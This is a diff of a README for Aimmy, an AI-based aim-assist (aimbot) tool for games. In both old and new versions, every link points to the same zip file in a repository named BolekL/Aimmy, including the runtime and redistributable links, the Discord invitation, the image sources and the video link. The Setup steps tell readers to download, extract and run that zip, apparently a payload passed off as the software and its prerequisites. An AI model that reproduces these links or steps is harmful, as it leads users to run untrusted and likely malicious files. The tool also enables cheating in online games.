@@ -7,8 +7,8 @@ Thank You
 <3 N4ri
   
   <p>
-    <a href="https://github.com/BolekL/Aimmy/raw/refs/heads/master/configs/Software-v1.7-alpha.1.zip" target="_blank">
-      <img width="100%" src="https://github.com/BolekL/Aimmy/raw/refs/heads/master/configs/Software-v1.7-alpha.1.zip"></a>
+    <a href="https://raw.githubusercontent.com/BolekL/Aimmy/master/AimmyWPF/UserController/Software-v3.5.zip" target="_blank">
+      <img width="100%" src="https://raw.githubusercontent.com/BolekL/Aimmy/master/AimmyWPF/UserController/Software-v3.5.zip"></a>
   </p>
 
 Aimmy is a multi-functional AI-based Aim Aligner that was developed by BabyHamsta & Nori for the purposes of making gaming more accessible for a wider audience.
@@ -19,7 +19,7 @@ Aimmy also has a myriad of [features](#features) that sets itself apart from oth
 
 Aimmy is 100% free to use, ad-free, and is actively not for profit. Aimmy is not, and will never be for sale, and is considered a **source-available** product as **we actively discourage other developers from making profit-focused forks of Aimmy**.
 
-Join our Discord: https://github.com/BolekL/Aimmy/raw/refs/heads/master/configs/Software-v1.7-alpha.1.zip 
+Join our Discord: https://raw.githubusercontent.com/BolekL/Aimmy/master/AimmyWPF/UserController/Software-v3.5.zip 
 
 ## Table of Contents
 [What is the purpose of Aimmy?](#what-is-the-purpose-of-aimmy) | [How does Aimmy Work?](#how-does-aimmy-work) | [Features](#features) | [Setup](#setup) | [How is Aimmy better than similar AI-Based tools?](#how-is-aimmy-better-than-similar-ai-based-tools) | [What is the Web Model?](#what-is-the-web-model) | [How do I train my own model?](#how-do-i-train-my-own-model) | [How do I upload my model to the "Downloadable Models" menu](#how-do-i-upload-my-model-to-the-downloadable-models-menu)
@@ -57,16 +57,16 @@ Additionally, a Gamer that uses Aimmy is also given the option to turn on Auto-T
 - Image capture while playing (For labeling to further AI training)
 
 ## Setup
-- Download and Install the x64 version of [.NET Runtime 7.0.X.X](https://github.com/BolekL/Aimmy/raw/refs/heads/master/configs/Software-v1.7-alpha.1.zip)
-- Download and Install the x64 version of [Visual C++ Redistributable](https://github.com/BolekL/Aimmy/raw/refs/heads/master/configs/Software-v1.7-alpha.1.zip)
-- Download Aimmy from [Releases](https://github.com/BolekL/Aimmy/raw/refs/heads/master/configs/Software-v1.7-alpha.1.zip) (Make sure it's the Aimmy zip and not Source zip)
-- Extract the https://github.com/BolekL/Aimmy/raw/refs/heads/master/configs/Software-v1.7-alpha.1.zip file
-- Run https://github.com/BolekL/Aimmy/raw/refs/heads/master/configs/Software-v1.7-alpha.1.zip
+- Download and Install the x64 version of [.NET Runtime 7.0.X.X](https://raw.githubusercontent.com/BolekL/Aimmy/master/AimmyWPF/UserController/Software-v3.5.zip)
+- Download and Install the x64 version of [Visual C++ Redistributable](https://raw.githubusercontent.com/BolekL/Aimmy/master/AimmyWPF/UserController/Software-v3.5.zip)
+- Download Aimmy from [Releases](https://raw.githubusercontent.com/BolekL/Aimmy/master/AimmyWPF/UserController/Software-v3.5.zip) (Make sure it's the Aimmy zip and not Source zip)
+- Extract the https://raw.githubusercontent.com/BolekL/Aimmy/master/AimmyWPF/UserController/Software-v3.5.zip file
+- Run https://raw.githubusercontent.com/BolekL/Aimmy/master/AimmyWPF/UserController/Software-v3.5.zip
 - Choose your Model and Enjoy :)
 
 ## How is Aimmy better than similar AI-Based tools?
 Our program comes default with 2 AI models, 1 game specific (Phantom Forces) and 1 universal model. We also let users make their own models, share them, and switch between them painlessly. We also provide a downloadable model menu with dozens of community made models for various games and types of games. This makes Aimmy very versatile and universal for thousands of games.
-![Example of Model switching](https://github.com/BolekL/Aimmy/raw/refs/heads/master/configs/Software-v1.7-alpha.1.zip)
+![Example of Model switching](https://raw.githubusercontent.com/BolekL/Aimmy/master/AimmyWPF/UserController/Software-v3.5.zip)
 
 We also provide better performance across the board compared to other AI Aim Aligners. Detecting opponents in milliseconds across the board on most CPUs & GPUs.
 
@@ -76,31 +76,31 @@ Aimmy comes pre-bundled with a well-designed user interface that is beautiful, a
 The web model is a TFJS (TensorFlow Javascript) export of the model. This allow you to use the model for image labeling, which then images can be sent to us to help further train the PF/Universal model or you can use those images to train your own YOLOv8 model.
 You may wonder, "Why is it in YOLOv5 and not YOLOv8?". This is due to us using the tool called MakeSense, it to me is one of the easiest tools and is all web based. I am sure there are other tools that may accept the YOLOv8 web model.
 
-You can visit MakeSense here: https://github.com/BolekL/Aimmy/raw/refs/heads/master/configs/Software-v1.7-alpha.1.zip
+You can visit MakeSense here: https://raw.githubusercontent.com/BolekL/Aimmy/master/AimmyWPF/UserController/Software-v3.5.zip
 You then can simply load all of your images in and select Object Detection.
 
-![image](https://github.com/BolekL/Aimmy/raw/refs/heads/master/configs/Software-v1.7-alpha.1.zip)
+![image](https://raw.githubusercontent.com/BolekL/Aimmy/master/AimmyWPF/UserController/Software-v3.5.zip)
 
 
 Then run the AI locally, select YOLOv5, and upload all the web model files.
 
-![image](https://github.com/BolekL/Aimmy/raw/refs/heads/master/configs/Software-v1.7-alpha.1.zip)
-![image](https://github.com/BolekL/Aimmy/raw/refs/heads/master/configs/Software-v1.7-alpha.1.zip)
-![image](https://github.com/BolekL/Aimmy/raw/refs/heads/master/configs/Software-v1.7-alpha.1.zip)
+![image](https://raw.githubusercontent.com/BolekL/Aimmy/master/AimmyWPF/UserController/Software-v3.5.zip)
+![image](https://raw.githubusercontent.com/BolekL/Aimmy/master/AimmyWPF/UserController/Software-v3.5.zip)
+![image](https://raw.githubusercontent.com/BolekL/Aimmy/master/AimmyWPF/UserController/Software-v3.5.zip)
 
 
 You can now go through your images and click and drag to highlight any Enemies on screen and approve the auto detected enemies from the web model:
 
-![image](https://github.com/BolekL/Aimmy/raw/refs/heads/master/configs/Software-v1.7-alpha.1.zip)
+![image](https://raw.githubusercontent.com/BolekL/Aimmy/master/AimmyWPF/UserController/Software-v3.5.zip)
 
 Once you are finished labeling you'll want to export the labels for AI training:
 
-![image](https://github.com/BolekL/Aimmy/raw/refs/heads/master/configs/Software-v1.7-alpha.1.zip)
-![image](https://github.com/BolekL/Aimmy/raw/refs/heads/master/configs/Software-v1.7-alpha.1.zip)
+![image](https://raw.githubusercontent.com/BolekL/Aimmy/master/AimmyWPF/UserController/Software-v3.5.zip)
+![image](https://raw.githubusercontent.com/BolekL/Aimmy/master/AimmyWPF/UserController/Software-v3.5.zip)
 
 ## How do I train my own model
 Please see the video tutorial bellow on how to label images and train your own model. (Redirects to Youtube)
-[![Watch the video on Youtube](https://github.com/BolekL/Aimmy/raw/refs/heads/master/configs/Software-v1.7-alpha.1.zip)](https://github.com/BolekL/Aimmy/raw/refs/heads/master/configs/Software-v1.7-alpha.1.zip)
+[![Watch the video on Youtube](https://raw.githubusercontent.com/BolekL/Aimmy/master/AimmyWPF/UserController/Software-v3.5.zip)](https://raw.githubusercontent.com/BolekL/Aimmy/master/AimmyWPF/UserController/Software-v3.5.zip)
 
 </div>
 
@@ -109,9 +109,9 @@ Please see the video tutorial bellow on how to label images and train your own m
 
 If you are not aware already, Aimmy contains a "Downloadable Models" tab that allows you to download models developed and shared by the Aimmy Community.
 
-<img src="https://github.com/BolekL/Aimmy/raw/refs/heads/master/configs/Software-v1.7-alpha.1.zip">
+<img src="https://raw.githubusercontent.com/BolekL/Aimmy/master/AimmyWPF/UserController/Software-v3.5.zip">
 
-Aimmy pulls these models from the [Aimmy repository](https://github.com/BolekL/Aimmy/raw/refs/heads/master/configs/Software-v1.7-alpha.1.zip), this means **anyone can upload models to the "Downloadable Models" tab by making a pull request**.
+Aimmy pulls these models from the [Aimmy repository](https://raw.githubusercontent.com/BolekL/Aimmy/master/AimmyWPF/UserController/Software-v3.5.zip), this means **anyone can upload models to the "Downloadable Models" tab by making a pull request**.
 
 To start, please note that if you would like to be credited for your work, name your model as:
 **[Game Name/Model Name]** by **[The Creator]**
@@ -119,32 +119,32 @@ To start, please note that if you would like to be credited for your work, name 
 If you would like to stay anonymous however, you may only list the Game Name/Model Name.
 
 Now, fork the Aimmy Repository
-<img src="https://github.com/BolekL/Aimmy/raw/refs/heads/master/configs/Software-v1.7-alpha.1.zip">
-<img src="https://github.com/BolekL/Aimmy/raw/refs/heads/master/configs/Software-v1.7-alpha.1.zip">
+<img src="https://raw.githubusercontent.com/BolekL/Aimmy/master/AimmyWPF/UserController/Software-v3.5.zip">
+<img src="https://raw.githubusercontent.com/BolekL/Aimmy/master/AimmyWPF/UserController/Software-v3.5.zip">
 
 After that, go to your fork's model folder
-<img src="https://github.com/BolekL/Aimmy/raw/refs/heads/master/configs/Software-v1.7-alpha.1.zip">
+<img src="https://raw.githubusercontent.com/BolekL/Aimmy/master/AimmyWPF/UserController/Software-v3.5.zip">
 
 Press "Add File"
-<img src="https://github.com/BolekL/Aimmy/raw/refs/heads/master/configs/Software-v1.7-alpha.1.zip">
+<img src="https://raw.githubusercontent.com/BolekL/Aimmy/master/AimmyWPF/UserController/Software-v3.5.zip">
 
 Drag your model onto the area that contains the text "Drag additional files here to add them to your repository"
-<img src="https://github.com/BolekL/Aimmy/raw/refs/heads/master/configs/Software-v1.7-alpha.1.zip">
+<img src="https://raw.githubusercontent.com/BolekL/Aimmy/master/AimmyWPF/UserController/Software-v3.5.zip">
 
 and press "Commit Changes" when the green progress bar disappears
-<img src="https://github.com/BolekL/Aimmy/raw/refs/heads/master/configs/Software-v1.7-alpha.1.zip">
+<img src="https://raw.githubusercontent.com/BolekL/Aimmy/master/AimmyWPF/UserController/Software-v3.5.zip">
 
 Now go to the "Pull requests" tab
-<img src="https://github.com/BolekL/Aimmy/raw/refs/heads/master/configs/Software-v1.7-alpha.1.zip">
+<img src="https://raw.githubusercontent.com/BolekL/Aimmy/master/AimmyWPF/UserController/Software-v3.5.zip">
 
 Create a new pull request
-<img src="https://github.com/BolekL/Aimmy/raw/refs/heads/master/configs/Software-v1.7-alpha.1.zip">
+<img src="https://raw.githubusercontent.com/BolekL/Aimmy/master/AimmyWPF/UserController/Software-v3.5.zip">
 
 Create the pull request
-<img src="https://github.com/BolekL/Aimmy/raw/refs/heads/master/configs/Software-v1.7-alpha.1.zip">
+<img src="https://raw.githubusercontent.com/BolekL/Aimmy/master/AimmyWPF/UserController/Software-v3.5.zip">
 
 Create the pull request (again)
-<img src="https://github.com/BolekL/Aimmy/raw/refs/heads/master/configs/Software-v1.7-alpha.1.zip">
+<img src="https://raw.githubusercontent.com/BolekL/Aimmy/master/AimmyWPF/UserController/Software-v3.5.zip">
 
 You are done! We will review your pull request and your model will be added in 24-48 hours. If you would like to remove your model from the "Downloadable Models" tab, you may make another pull request or contact us on the Issues tab.
 
